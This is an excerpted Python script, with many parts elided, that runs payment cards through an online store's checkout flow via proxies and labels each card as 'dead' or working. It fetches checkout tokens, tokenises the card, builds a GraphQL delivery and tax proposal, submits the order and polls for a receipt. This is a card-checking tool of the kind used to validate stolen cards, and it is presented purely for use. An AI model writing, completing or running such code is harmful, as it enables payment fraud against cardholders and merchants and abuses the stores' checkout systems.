...
def make_request(url, method='GET', headers=None, json_data=None, data=None, cookies=None, proxy=None, timeout=20):
    for attempt in range(max_retries):
        try:
            ...
            log(f"Retry {attempt+1}/{max_retries}: {str(e)[:40]}")
...
def check_card(card_str, site_url, proxy_str):
    ...
    try:
        ...
        if not checkout_token:
            return {'status': 'error', 'message': '[ERROR] No checkout token'}
        ...
        initial_handle = ""  # Will be set from proposal
        
        if not x_checkout_one_session_token or not queue_token:
            return {'status': 'error', 'message': '[ERROR] Missing tokens'}
        
        log(f"Session OK | Country: {country_code}")
    except Exception as e:
        return {'status': 'error', 'message': f'[ERROR] Session: {str(e)[:40]}'}
    
    # Step 3: Get card token
    ...
    try:
        ...
        if not cctoken:
            ...
            return {'status': 'dead', 'message': '[DEAD] No token'}
        
        log(f"Token: {cctoken[:20]}...")
    except Exception as e:
        return {'status': 'dead', 'message': f'[DEAD] Token: {str(e)[:40]}'}
    
    address = get_address_details(country_code)
    
    # Step 4: Proposal
    log("Step 4: Getting proposal...")
    ...
    try:
        ...
        # Get proposal with full fragment definitions for union types
        propayload = {
        ...
        if '"errors"' in response.text[:500]:
            log(f"GraphQL Error: {response.text[:150]}")
        else:
            # Log first part of response to see structure
            log(f"Proposal resp: {response.text[:200]}")
        ...
        # Debug: log proposal response structure
        negotiate_result = data.get("data", {}).get("session", {}).get("negotiate", {})
        if negotiate_result.get("errors"):
            log(f"Proposal errors: {negotiate_result.get('errors')}")
        
        seller_proposal = negotiate_result.get("result", {}).get("sellerProposal")
        
        if not seller_proposal:
            log(f"No sellerProposal, checking response...")
            # Try alternative paths
            result = negotiate_result.get("result", {})
            if result:
                log(f"Result type: {result.get('__typename', 'unknown')}")
        
        # Extract tax from proposal to use in submit
        tax = "0"
        
        if seller_proposal:
            # Try to get handle from availableDeliveryStrategies first
            ...
            if delivery_lines:
                ...
                # If no availableDeliveryStrategies, try selectedDeliveryStrategy
                if not handle:
                    selected = delivery_lines[0].get("selectedDeliveryStrategy", {})
                    handle = selected.get("handle", "")
            
            # Fallback: search in raw response or use initial_handle
            if not handle:
                handle_search = re.search(r'"handle":"([^"]+)"', response.text)
                handle = handle_search.group(1) if handle_search else initial_handle
            
            # Extract tax from seller proposal
            tax = seller_proposal.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "0")
            if not tax or tax == "0":
                # Fallback: search in raw response
                tax_search = re.search(r'"totalTaxAmount":\{"value":\{"amount":"([^"]+)"', response.text)
                if not tax_search:
                    tax_search = re.search(r'"totalAmountIncludedInTarget":\{"value":\{"amount":"([^"]+)"', response.text)
            ...
            log(f"Handle: {handle} | Tax: ${tax} | Total: ${total_amount}")
        
        log(f"Gateway: {gateway_result} | Total: ${total_amount}")
    except Exception as e:
        log(f"Proposal error: {str(e)[:40]}")
    
    if not handle:
        # Try initial_handle from checkout page, else use standard
        handle = initial_handle if initial_handle else "standard"
        log(f"Fallback handle: {handle}")
    ...
    try:
        ...
        # Check for receipt in different response paths
        ...
        if not receipt_id:
            ...
            if 'CARD_DECLINED' in response_text or 'card_declined' in response_text.lower():
                ...
                # Extract the actual error from SubmitRejected
            ...
            log("No receipt ID, checking raw response...")
            return {'status': 'dead', 'message': f'[DEAD] No Receipt | {gateway_result}'}
        
        log(f"Receipt: {receipt_id[:20]}...")
    except Exception as e:
        return {'status': 'dead', 'message': f'[DEAD] Submit: {str(e)[:40]}'}
    ...
    try:
        ...
        pload = {
            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id redirectUrl confirmationPage{url __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}',
            'variables': {'receiptId': receipt_id, 'sessionToken': x_checkout_one_session_token},
